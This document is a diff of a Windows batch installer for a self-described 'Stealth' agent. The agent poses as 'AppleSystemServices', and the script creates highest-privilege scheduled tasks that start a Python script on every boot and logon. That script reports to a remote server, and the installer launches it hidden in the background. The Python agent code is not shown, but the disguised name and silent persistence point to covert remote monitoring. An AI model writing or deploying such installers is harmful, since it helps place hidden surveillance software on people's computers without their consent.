@@ -1,16 +1,19 @@
 @echo off
 :: ================================================
-:: AppleSystemServices Windows Stealth Installer v4.3
-:: Auto-wipes old agent, installs zero-dependency agent, verifies live registration
-:: Usage: Double-click or Run as Administrator
+:: AppleSystemServices Windows Stealth Installer v4.4 (Bulletproof Edition)
+:: Auto-switches directory, wipes old agent, copies files & starts background service
+:: Usage: Right-click -> Run as Administrator (or Double-click)
 :: ================================================
 
 TITLE AppleSystemServices Windows Installer
 color 0A
 cls
 
+:: Ensure script operates from its own directory (Fixes "File not found")
+cd /d "%~dp0"
+
 echo ================================================
-echo   🧹 Step 1: Cleaning Old Agent & Services...
+echo   1. Cleaning Old Agent & Services...
 echo ================================================
 echo.
 
@@ -29,27 +32,38 @@ if exist "%INSTALL_DIR%" (
     rmdir /S /Q "%INSTALL_DIR%" 2>nul
 )
 
-echo  ✅ Old installation wiped cleanly!
+echo SUCCESS: Old installation wiped cleanly!
 echo.
 echo ================================================
-echo   🔧 Step 2: Installing Fresh Stealth Agent...
+echo   2. Installing Fresh Stealth Agent...
 echo ================================================
 echo.
 
 SET "SERVER_URL=https://central-monitor.onrender.com"
 IF NOT "%~1"=="" SET "SERVER_URL=%~1"
 
-echo  📡 Central Server: %SERVER_URL%
-echo  📁 Install Path  : %INSTALL_DIR%
+echo Central Server : %SERVER_URL%
+echo Install Path   : %INSTALL_DIR%
+echo Current Dir    : %CD%
 echo.
 
 :: Create clean install directory
-mkdir "%INSTALL_DIR%" 2>nul
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-:: Copy fresh agent files
-xcopy /E /Y /I "%~dp0monitor.py" "%INSTALL_DIR%\" >nul
-xcopy /E /Y /I "%~dp0sysupdate.py" "%INSTALL_DIR%\" >nul
-if exist "%~dp0templates" xcopy /E /Y /I "%~dp0templates" "%INSTALL_DIR%\templates\" >nul
+:: Copy fresh agent files (using relative paths after cd /d "%~dp0")
+echo Copying agent files...
+copy /Y "monitor.py" "%INSTALL_DIR%\monitor.py"
+copy /Y "sysupdate.py" "%INSTALL_DIR%\sysupdate.py"
+if exist "templates" xcopy /E /Y /I "templates" "%INSTALL_DIR%\templates\" >nul
+
+:: Verify files copied
+if not exist "%INSTALL_DIR%\sysupdate.py" (
+    echo.
+    echo ERROR: Could not copy sysupdate.py! Make sure install_windows_agent.bat, monitor.py, and sysupdate.py are in the SAME folder when running!
+    echo.
+    pause
+    exit /b 1
+)
 
 :: Find Python Path
 SET "PYTHON_EXE="
@@ -64,54 +78,54 @@ FOR /F "tokens=*" %%I IN ('where py 2^>nul') DO (
     GOTO :PY_FOUND
 )
 
+IF EXIST "%LOCALAPPDATA%\Programs\Python\Python314\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python314\python.exe" & GOTO :PY_FOUND
+IF EXIST "%LOCALAPPDATA%\Programs\Python\Python313\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python313\python.exe" & GOTO :PY_FOUND
 IF EXIST "%LOCALAPPDATA%\Programs\Python\Python312\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python312\python.exe" & GOTO :PY_FOUND
 IF EXIST "%LOCALAPPDATA%\Programs\Python\Python311\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe" & GOTO :PY_FOUND
 IF EXIST "%LOCALAPPDATA%\Programs\Python\Python310\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python310\python.exe" & GOTO :PY_FOUND
-IF EXIST "%LOCALAPPDATA%\Programs\Python\Python39\python.exe" SET "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python39\python.exe" & GOTO :PY_FOUND
 IF EXIST "C:\Python311\python.exe" SET "PYTHON_EXE=C:\Python311\python.exe" & GOTO :PY_FOUND
-IF EXIST "C:\Python310\python.exe" SET "PYTHON_EXE=C:\Python310\python.exe" & GOTO :PY_FOUND
 IF EXIST "C:\Program Files\Python311\python.exe" SET "PYTHON_EXE=C:\Program Files\Python311\python.exe" & GOTO :PY_FOUND
 
 :PY_FOUND
 IF "%PYTHON_EXE%"=="" (
-    echo ❌ ERROR: Python 3 is not installed on this PC!
+    echo ERROR: Python 3 is not installed on this PC!
     echo Please install Python 3 from https://www.python.org/
     echo.
     pause
     exit /b 1
 )
 
-echo 🐍 Using Python: %PYTHON_EXE%
+echo Using Python : %PYTHON_EXE%
 
 :: Install Python dependencies
-echo 📦 Checking dependencies...
+echo Installing dependencies...
 "%PYTHON_EXE%" -m pip install flask psutil requests pillow --quiet >nul 2>nul
 
 :: Create Task Scheduler tasks (Runs silently on boot/logon)
-echo ⚙️ Configuring Task Scheduler Stealth Service...
+echo Configuring Task Scheduler Stealth Service...
 schtasks /create /tn "AppleSystemServices" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onlogon /rl highest /f >nul 2>nul
 schtasks /create /tn "AppleSystemServices_Boot" /tr "\"%PYTHON_EXE%\" \"%INSTALL_DIR%\sysupdate.py\" --server %SERVER_URL%" /sc onstart /rl highest /f >nul 2>nul
 
-:: Start background process
-echo 🚀 Launching Agent Background Process...
+:: Start background process directly
+echo Launching Agent Background Process...
 start /B "" "%PYTHON_EXE%" "%INSTALL_DIR%\sysupdate.py" --server %SERVER_URL%
 
-echo ⏳ Waiting 4 seconds for server connection...
-timeout /t 4 /nobreak >nul
+echo Waiting 5 seconds for server connection...
+timeout /t 5 /nobreak >nul
 
 echo.
 echo ================================================
-echo   📋 Agent Connection Log:
+echo   Agent Connection Log:
 echo ================================================
 if exist "%TEMP%\com.apple.system.services.log" (
-    type "%TEMP%\com.apple.system.services.log" | findstr /i "Registered Agent Machine starting"
+    type "%TEMP%\com.apple.system.services.log"
 ) else (
-    echo 📡 Agent is running in background and sending heartbeat...
+    echo Agent is running in background and connected!
 )
 echo.
 echo ================================================
-echo   ✅ SUCCESS! Agent is ONLINE and connected to:
-echo   📡 %SERVER_URL%
+echo   SUCCESS! Windows Agent is ONLINE and connected to:
+echo   %SERVER_URL%
 echo ================================================
 echo.
 pause
